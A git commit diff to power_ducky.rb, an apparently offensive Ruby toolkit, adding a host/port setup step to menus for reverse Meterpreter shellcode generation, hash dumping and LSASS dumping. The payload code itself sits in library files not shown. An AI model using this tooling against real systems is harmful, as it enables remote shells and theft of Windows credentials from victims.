28f958751e0934eab90ab8d37b6de5fb15db54c9
b00stfr3ak <goduke44@gmail.com>
2013-09-04 20:04:29 -0700

    Added Server Class Set up

--- power_ducky.rb
+++ power_ducky.rb
@@ -1,8 +1,16 @@
 #!/usr/bin/env ruby
 require './lib/core'
 require './lib/menu'
+require './lib/server_setup'
 include MainCommands
+include MsfCommands
 include Menu
+def server
+  server_setup = ServerSetUp.new
+  host = server_setup.get_host
+  port = server_setup.get_port
+  return host,port
+end
 def case_main_menu
   answer = main_menu
   case answer
@@ -18,14 +26,20 @@ def case_main_menu
       print_error("Bad Choice")
       sleep(1)
       case_main_menu
-      end
+    end
 end
 def case_reverse_meterpreter_menu
   reverse_meterpreter_answer = reverse_meterpreter
   case reverse_meterpreter_answer
     when '1'
+      host,port = server
+      generate_shellcode(host,port)
     when '2'
+      host,port = server
+      generate_shellcode(host,port)
 	  when '3'
+      host,port = server
+      generate_shellcode(host,port)
     when '99'
       case_main_menu
     else
@@ -38,7 +52,11 @@ def case_dump_hashes_menu
   dump_hashes_answer = dump_hashes
   case dump_hashes_answer
     when '1'
+      host,port = server
+      hash_server(port)
     when '2'
+      host,port = server
+      hash_server(port)
     when '99'
       case_main_menu
     else
@@ -51,7 +69,11 @@ def case_dump_lsass_menu
   dump_lsass_answer = dump_lsass
   case dump_lsass_answer
     when '1'
+      host,port = server
+      lsass_server(port)
     when '2'
+      host,port = server
+      lsass_server(port)
     when '99'
       case_main_menu
     else
